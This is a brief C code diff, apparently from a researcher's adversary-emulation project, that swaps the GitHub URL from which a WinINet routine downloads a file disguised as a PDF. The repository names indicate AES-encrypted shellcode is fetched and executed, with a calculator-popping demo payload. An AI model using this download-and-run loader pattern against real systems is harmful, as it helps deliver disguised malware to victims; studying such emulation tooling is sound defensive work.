@@ -63,7 +63,7 @@ char* getWebResource() {
 	LPCWSTR headers = L"Host: github.com\r\nUser-Agent: boku\r\nReferer: boku7.github.io\r\n\r\n\r\n";
 	hHttpFile = InternetOpenUrl(
 		hSession,            // session handle
-		L"https://github.com/boku7/ColonialPipeline-PdfDownloadRunAesMalware/raw/main/aesPopCalc.pdf",   // URL to access
+		L"https://github.com/boku7/Nobelium-PdfDLRunAesShellcode/raw/main/aesPopCalc.pdf",   // URL to access
 		0, 0, 0, 0);
 	DWORD dwFileSize;
 	dwFileSize = 24000;
